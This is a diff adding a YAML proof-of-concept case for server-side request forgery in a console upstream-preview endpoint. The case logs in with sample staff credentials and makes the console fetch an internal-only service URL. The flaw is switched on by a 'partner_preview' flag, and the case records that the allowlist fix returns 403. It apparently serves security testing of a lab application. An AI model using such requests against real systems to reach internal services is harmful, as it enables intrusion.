@@ -1,0 +1,19 @@
+# LG-SSRF-001 — server-side request forgery in the console upstream-preview endpoint.
+# Config-gated by partner_preview (on under the permissive profile).
+preconditions:
+  - "a signed-on staff session (any real login)"
+  - "partner_preview=on (the upstream allowlist is dropped)"
+steps:
+  - call: "POST /login (console)"
+    body: "staff_id=TLR001&password=teller-pw (application/x-www-form-urlencoded)"
+    expect: "an lgsession cookie is set"
+  - call: "GET /fetch?url=http://fortran:8080/healthz (console, with the session cookie)"
+    note: >
+      'fortran' is an in-cluster service name that resolves only inside the compose network; the
+      attacker's host cannot reach it directly. It is not the allowlisted gateway.
+    expect: "the response body is 'ok' -- the console fetched an internal service on the caller's behalf"
+observable: >
+  With partner_preview=on the console fetches any caller-supplied url, so a request for an internal-only
+  service (http://fortran:8080/healthz, reachable only inside the cluster) returns that service's
+  response ('ok') through the console -- proving SSRF. With the fix (gateway-only allowlist) the
+  request is rejected with 403. Exploitable only when partner_preview=on.
